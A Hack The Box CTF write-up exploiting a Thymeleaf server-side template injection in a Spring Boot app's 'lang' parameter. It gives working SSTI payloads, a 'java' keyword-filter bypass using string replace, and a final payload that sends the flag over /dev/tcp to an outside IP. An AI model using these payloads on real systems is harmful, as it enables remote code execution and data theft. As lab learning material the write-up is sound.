
> [!Challenge Details]
> > Platform - Hackthebox
> > Challenge Category - Web ( Server Side Template injection )
> > Difficulty Level - Moderate

## Initial Analysis - Recon

We have been provided with IP Address of the website along with source code.
![[challenge.png]]

As we have code available, we will perform some static code review followed by dynamic app testing.

#### Code Review

Opened the code folder in VS code, the directory structure is as below. 
![[directory_structure.png]]

We will jump to pom.xml ( A Project Object Model or POM is the fundamental unit of work in Maven. It is an XML file that contains information about the project and configuration details used by Maven to build the project. ) and from here we can note the list of dependencies along with version which can be useful in later stages to search for known vulnerabilities.

```xml
<properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-thymeleaf</artifactId>
            <version>2.2.0.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <version>2.2.0.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <version>2.2.0.RELEASE</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.xerial</groupId>
            <artifactId>sqlite-jdbc</artifactId>
            <version>3.34.0</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
            <version>2.2.0.RELEASE</version>
        </dependency>
        <dependency>
            <groupId>com.github.gwenn</groupId>
            <artifactId>sqlite-dialect</artifactId>
            <version>0.1.1</version>
        </dependency>
    </dependencies>
```

Spring Boot is build on top of MVC (Model View Controller) framework: 
- **Model:** The Model represents the data and business logic of the application. It is responsible for managing the state of the application and interacting with the database.
- **View:** components that are responsible for rendering the user interface. They present data from the model to the user in a format that can be understood, typically HTML, but they can also be in other formats like JSON or XML for APIs.
- **Controller:** The Controller handles incoming requests, processes them (often interacting with the Model), and returns the appropriate response.
- **Static File:** Static files are resources like CSS, JavaScript, and images that are served directly to the client without any processing

We have 2 controller files, one for account login and register page, and other for index.

The account controller doesn't have much to look at as the flag is available in file and hence we have to get it through RCE, hence SQLi or login bypass would not be helpful. 

```java
@Controller
public class AccountController {
    @Autowired
    private UserRepository userRepository;
    @GetMapping("/login")
    public String loginPage() {
        return "login";
    }
    @PostMapping("/login")
    public String login(@RequestParam String username, @RequestParam String password, RedirectAttributes redirectAttributes, HttpSession session) {
        try {
            Users user = userRepository.findByUsername(username);
            if (user != null && user.getPassword().equals(password)) {
                session.setAttribute("user", user);
                return "redirect:/";
            } else {
                redirectAttributes.addFlashAttribute("errorMessage", "Invalid username or password.");
                return "redirect:/login";
            }
        } catch (Exception e) {
            redirectAttributes.addFlashAttribute("errorMessage", "An error occurred while logging in.");
            return "redirect:/login";
        }
    }
    @GetMapping("/register")
    public String registerPage() {
        return "register";
    }
    @PostMapping("/register")
    public String register(@RequestParam String username, @RequestParam String password, RedirectAttributes redirectAttributes) {
        try {
            if (userRepository.findByUsername(username) != null) {
                redirectAttributes.addFlashAttribute("errorMessage", "Username already exists.");
                return "redirect:/register";
            }
            Users user = new Users();
            user.setUsername(username);
            user.setPassword(password);
            userRepository.save(user);
            return "redirect:/login";
        } catch (Exception e) {
            redirectAttributes.addFlashAttribute("errorMessage", "An error occurred while registering.");
            return "redirect:/register";
        }
    }
}
```

In index controller things go interesting, specifically the `lang` parameter, an authenticated user can pass `lang` in get request and based on value pass the Thymeleaf would render the page.

As user inputs is directly included in templates without proper sanitization or escaping, potentially allowing an attacker to execute arbitrary expressions or access sensitive data, which can lead to Server-Side Template Injection and we are going to focus on the same.

``` java
@Controller
public class IndexController {
    @GetMapping("/")
    public String index(@RequestParam(defaultValue = "en") String lang, HttpSession session, RedirectAttributes redirectAttributes) {
        if (session.getAttribute("user") == null) {
            return "redirect:/login";
        }
        if (lang.toLowerCase().contains("java")) {
            redirectAttributes.addFlashAttribute("errorMessage", "But.... For what?");
            return "redirect:/";
        }
        return lang + "/index";
    }
}
```

#### Validation of SSTI

First we have to confirm our theory and validate if the code is really vulnerable for SSTI. 
You can read more about vulnerability [here](https://portswigger.net/research/server-side-template-injection), amazing research paper published James Kettle, Director of Research at PortSwigger.

So we will use Burp now and try to exploit the parameter `lang` by sending malicious request using repeater.

With expected input, `lang=fr`
![[request_1.png]]

With arbitrary input , `lang=xyz`
![[request_2.png]]

Now with malicious request to validate the vulnerability, `lang=__${7*7}__::.x`
![[ssti_test.png]]

HTTP 400, this is not what we expected, it is a get request, lets try with URL encoded payload `lang=%5f%5f%24%7b%37%2a%37%7d%5f%5f%3a%3a%2e%78`, and whola!!! our input `7*7` has been processed by server and as 49, and because of no controller definition for given value we are getting the server side error.
![[ssti_validate.png]]

#### Preparing Exploit

Now we have our theory validated, we will try to perform RCE (remote code execution) on the server and read the flag, it is always better to just print current working directory on the server to confirm the RCE.

I'm not java expert, and hence I was banging my head around the internet to findout a way to get RCE and came across [Spring Pentest guide ](https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/)

And we have our input ready to be tested `"".getClass().forName("java.lang.Runtime").getRuntime().exec("pwd")`

![[rce_try1.png]]

But, what we are getting redirected to homepage, and this is because of the following code added in index controller, and it would not allow us to pass java word in the request value.

```java
if (lang.toLowerCase().contains("java")) {
            redirectAttributes.addFlashAttribute("errorMessage", "But.... For what?");
            return "redirect:/";
```

One the same testing guide we have string manipulation guide available `{"dfd".replace("d", "x")}`  and in our exploit we are passing `java.lang.Runtime` as string and we can use the same technique here, and our exploit would look something like `"".getClass().forName("jawa.lang.Runtime".replace("w","v")).getRuntime().exec("pwd")` and we are able to perform RCE.

![[rce_try2.png]]

But still it returns the object instance and not actual value what we want, and hence we have to find out a way to get a reverse shell or perform SSRF. And with bit of research we have our request crafted.

#### Showtime

To listen on public IP we can either use Ngrok or any cloud instance reachable from internet, and here I have used GCE listening on port 1337.

Our final payload is `"".getClass().forName("jawa.lang.Runtime".replace("w","v")).getRuntime().exec("bash -c cat${IFS}/flag*>&/dev/tcp/35.184.189.108/1337<&1")`

![[htb.mp4]]

#### Exploit Code Explanation 

- "".getClass().forName():
This part creates an empty string and retrieves its class object, which is java.lang.String.class. This is a way to get a reference to the class loader.

- .forName("jawa.lang.Runtime".replace("w","v")):
This line attempts to load a class by name. It takes the string "jawa.lang.Runtime" and replaces the letter w with v, resulting in "java.lang.Runtime". This is a clever way to obfuscate the string to avoid detection while still correctly referencing the Runtime class.

- .getRuntime():
This calls the static method getRuntime() of the Runtime class, which returns the current runtime object. This object allows the application to interface with the environment in which it is running.

- .exec("bash -c cat${IFS}/flag*>&/dev/tcp/35.184.189.108/1337<&1"):
This method executes the specified string command in a separate process.

## References
>https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability
>https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
>https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/
>https://portswigger.net/research/server-side-template-injection
>https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
